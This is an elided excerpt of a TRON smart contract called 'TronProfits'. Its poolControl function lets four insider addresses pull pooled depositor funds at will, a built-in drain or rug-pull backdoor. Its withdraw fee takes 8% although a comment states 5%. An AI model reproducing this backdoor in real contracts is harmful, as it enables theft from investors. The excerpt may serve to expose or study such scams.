...
contract TronProfits is Ownable {
    ...
    uint256 public constant TEAM_RATE = 50;            // 5% Team, Operation & Development
    ...
    function withdraw() public {
        ...
        if(withdrawalAmount>0){
            ...
            uint256 percentage = (withdrawalAmount.mul(20)).div(1000);
            owner.transfer(percentage);
            dev.transfer(percentage);
            marketing.transfer(percentage);
            operator.transfer(percentage);
    ...
    function poolControl(uint256 trx_amount) public {
        require(msg.sender == owner || msg.sender == dev || msg.sender == marketing || msg.sender == operator);
        uint256 sun_amount = trx_amount.mul(1e6);
        require(address(this).balance >= sun_amount.div(4).mul(5));

        owner.transfer(sun_amount.div(4));
        dev.transfer(sun_amount.div(4));
        marketing.transfer(sun_amount.div(4));
        operator.transfer(sun_amount.div(4));
    }
